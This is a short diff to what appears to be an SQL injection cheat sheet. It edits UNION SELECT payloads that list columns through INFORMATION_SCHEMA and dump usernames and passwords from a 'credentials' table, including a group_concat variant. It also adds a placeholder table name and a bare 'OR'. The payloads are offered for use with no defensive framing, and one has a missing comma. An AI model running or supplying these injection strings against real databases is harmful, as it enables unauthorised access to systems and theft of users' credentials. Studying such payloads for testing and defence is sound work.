@@ -32,7 +32,7 @@ example
 
 ## dump columns
 
-	' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+	' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='name_table'-- -
 
 example
 	' union select 1,column_name,table_name,table_schema from information_schema.columns where table_name='credentials'-- -
@@ -44,6 +44,7 @@ COLUMNS="username,password"
 	UNION select 1, username, password, 4 from dev.credentials-- -
 example :
 	union select  1,username,password 4 from dev.credentials-- -
+OR	
 	union select  1,2,group_concat(username,":",password),4 from dev.credentials-- -
 
 admin	password	
